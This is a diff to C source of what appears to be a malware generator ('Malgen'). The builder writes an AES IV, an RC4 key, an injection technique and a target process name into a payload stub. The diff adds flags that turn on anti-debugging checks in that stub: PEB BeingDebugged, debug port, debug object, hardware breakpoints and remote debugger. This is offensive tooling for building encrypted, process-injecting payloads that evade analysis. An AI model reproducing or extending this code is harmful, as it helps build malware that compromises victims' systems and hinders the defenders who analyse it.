@@ -15,6 +15,11 @@
 #define OFF_RC4_KEY         (OFF_AES_IV + 16)
 #define OFF_TECHNIQUE       (OFF_RC4_KEY + 16)
 #define OFF_TARGET          (OFF_TECHNIQUE + 1)
+#define OFF_CHECK_PEB       (OFF_TARGET + MAX_PROCESS_NAME)
+#define OFF_CHECK_DBGPORT   (OFF_CHECK_PEB + 1)
+#define OFF_CHECK_DBGOBJ    (OFF_CHECK_DBGPORT + 1)
+#define OFF_CHECK_HWBP      (OFF_CHECK_DBGOBJ + 1)
+#define OFF_CHECK_REMOTE    (OFF_CHECK_HWBP + 1)
 
 BYTE GetTechniqueIndex(InjectionTechnique technique) {
 	switch (technique) {
@@ -165,6 +170,11 @@ BOOL PatchBinary(MalgenConfig* config, LPVOID payload, SIZE_T payload_size) {
 	memcpy(stub_data + marker_offset + OFF_RC4_KEY, config->rc4_key, 16);
 	*(stub_data + marker_offset + OFF_TECHNIQUE) = GetTechniqueIndex(config->injection);
 	memcpy(stub_data + marker_offset + OFF_TARGET, config->target.process_name, strlen(config->target.process_name) + 1);
+	*(stub_data + marker_offset + OFF_CHECK_PEB) = (BYTE)config->anti_analysis.anti_debug.check_peb_being_debugged;
+	*(stub_data + marker_offset + OFF_CHECK_DBGPORT) = (BYTE)config->anti_analysis.anti_debug.check_debug_port;
+	*(stub_data + marker_offset + OFF_CHECK_DBGOBJ) = (BYTE)config->anti_analysis.anti_debug.check_debug_object;
+	*(stub_data + marker_offset + OFF_CHECK_HWBP) = (BYTE)config->anti_analysis.anti_debug.check_hardware_breakpoints;
+	*(stub_data + marker_offset + OFF_CHECK_REMOTE) = (BYTE)config->anti_analysis.anti_debug.check_remote_debugger;
 
 	hOutput = CreateFileA(config->output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 	if (hOutput == INVALID_HANDLE_VALUE) {
